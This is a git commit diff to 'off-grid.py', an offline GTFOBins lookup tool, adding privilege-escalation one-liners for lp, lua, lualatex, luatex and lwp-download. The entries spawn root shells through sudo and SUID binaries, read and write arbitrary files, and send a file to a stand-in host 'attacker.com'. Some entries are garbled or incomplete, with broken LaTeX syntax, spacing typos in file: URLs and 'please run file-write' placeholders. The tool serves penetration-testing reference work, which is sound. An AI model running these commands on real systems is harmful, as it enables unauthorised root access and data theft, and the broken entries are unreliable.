33ee8e08fd8ffd6a4b1c334cc9fb1e782522b997
S14X0r <s1ax0r@tutamail.com>
2025-01-05 18:25:24 -0500

    Add files via upload
    Updated

--- off-grid.py
+++ off-grid.py
@@ -2187,6 +2187,68 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "suid":
             bins.append("sudo install -m =xs $(which ltrace) .\n./ltrace -b -L /bin/bash")
 
+    elif zip_command == "lp":
+        if zip_options == "file-write":
+            bins.append("LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST")
+        elif zip_options == "file-read":
+            bins.append("please run file-write")
+        elif zip_options == "Shell":
+            bins.append("please run file-write")
+        elif zip_options == "sudo":
+            bins.append("please run file-write")
+        elif zip_options == "suid":
+            bins.append("please run file-write")
+
+    elif zip_command == "lua":
+        if zip_options == "Shell":
+            bins.append("lua -e 'os.execute(""/bin/sh"")'")
+        elif zip_options == "file-write":
+            bins.append("lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'")
+        elif zip_options == "file-read":
+            bins.append("lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which lua) .\nlua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'")
+        elif zip_options == "sudo":
+            bins.append("sudo lua -e 'os.execute(""/bin/sh"")'")
+
+    elif zip_command == "lualatex":
+        if zip_options == "Shell":
+            bins.append("lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
+        elif zip_options == "sudo":
+            bins.append("sudo lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which lualatex) .\n./lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
+        elif zip_options == "file-read":
+            bins.append("lualatex script.tex")
+        elif zip_options == "file-write":
+            bins.append("echo 'SCRIPT' > script.tex\n lualatex script.tex")
+
+    elif zip_command == "luatex":
+        if zip_options == "Shell":
+            bins.append("luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
+        elif zip_options == "sudo":
+            bins.append("sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which luatex) .\n./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
+        elif zip_options == "file-read":
+            bins.append("luatex file.tex")
+        elif zip_options == "file-write":
+            bins.append("echo 'DATA' > file.tex\nluatex file.tex")
+        
+    elif zip_command == "lwp-download":
+        if zip_options == "file-write":
+            bins.append("LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file: //$TF $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nTF=$(mktemp)\nlwp-download ""file://$LFILE"" $TF\ncat $TF")
+        elif zip_options == "sudo":
+            bins.append("sudo LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which lwp-download) .\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./lwp-download file: //$TF $LFILE")
+        elif zip_options == "Shell":
+            bins.append("lwp-download && bash")
+
+
+
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
         if zip_options == "Shell": #This will print out hints for more GTFO bins!
@@ -2202,7 +2264,7 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "gawk" or start == "gcloud" or start == "gcore" or start == "gdb" or start == "gem" or start == "genie" or start == "genisoimage" or start == "ghc" or start == "ghci" or start == "gimp" or start == "ginsh" or start == "git" or start == "grc" or start == "grep" or start == "gtester" or start == "gzip" or start == "hd" or start == "head" or start == "hexdump" or start == "highlight" or start == "hping3" or start == "iconv" or start == "iftop" or start == "install" or start == "ionice" or start == "ip" or start == "irb" or start == "ispell" or start == "jjs" or start == "joe" or start == "join" or start == "jounralctl" or start == "jq" or start == "jrunscript" or start == "jtag" or start == "julia" or start == "knife" or start == "ksh" or start == "ksshell" or start == "ksu" or start == "kubectl" or start == "latex" or start == "latexmk" or start == "less" or start == "ld.so" or start == "ldconfig" or start == "lftp" or start == "links" or start == "ln" or start == "loginctl" or start  == "logsave" or start == "look" or start == "ltrace" or start == "other":  
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "gawk" or start == "gcloud" or start == "gcore" or start == "gdb" or start == "gem" or start == "genie" or start == "genisoimage" or start == "ghc" or start == "ghci" or start == "gimp" or start == "ginsh" or start == "git" or start == "grc" or start == "grep" or start == "gtester" or start == "gzip" or start == "hd" or start == "head" or start == "hexdump" or start == "highlight" or start == "hping3" or start == "iconv" or start == "iftop" or start == "install" or start == "ionice" or start == "ip" or start == "irb" or start == "ispell" or start == "jjs" or start == "joe" or start == "join" or start == "jounralctl" or start == "jq" or start == "jrunscript" or start == "jtag" or start == "julia" or start == "knife" or start == "ksh" or start == "ksshell" or start == "ksu" or start == "kubectl" or start == "latex" or start == "latexmk" or start == "less" or start == "ld.so" or start == "ldconfig" or start == "lftp" or start == "links" or start == "ln" or start == "loginctl" or start  == "logsave" or start == "look" or start == "ltrace" or start == "lp" or start == "lua" or start == "lualatex" or start == "luatex" or start == "lwp-download" or start == "other":  
         zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
